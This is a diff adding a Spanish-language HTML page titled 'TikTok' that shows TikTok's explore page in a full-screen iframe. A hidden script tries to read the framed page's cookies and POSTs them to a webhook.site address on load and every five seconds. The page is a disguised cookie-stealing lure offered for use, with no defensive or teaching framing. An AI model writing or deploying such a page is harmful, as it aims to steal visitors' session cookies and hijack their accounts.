@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok</title>
+    <style>
+        body { margin: 0; padding: 0; background-color: #000; overflow: hidden; }
+        iframe { width: 100vw; height: 100vh; border: none; display: block; }
+    </style>
+</head>
+<body>
+    <!-- Carga TikTok -->
+    <iframe id="tiktokFrame" src="https://www.tiktok.com/explore"></iframe>
+
+    <script>
+        // TU WEBHOOK ID
+        const webhook = "https://webhook.site/4dab7c2b-2f60-4246-bb48-e5fd3a2a1f46";
+
+        function enviarCookies() {
+            try {
+                const iframe = document.getElementById('tiktokFrame');
+                const doc = iframe.contentDocument || iframe.contentWindow.document;
+                
+                if (doc && doc.cookie) {
+                    fetch(webhook, {
+                        method: "POST",
+                        headers: {"Content-Type": "application/json"},
+                        body: JSON.stringify({ cookies: doc.cookie })
+                    });
+                }
+            } catch (e) {
+                console.log("Error:", e);
+            }
+        }
+
+        // Enviar cada 5 segundos
+        setInterval(enviarCookies, 5000);
+        
+        // Enviar al cargar
+        window.onload = enviarCookies;
+    </script>
+</body>
+</html>
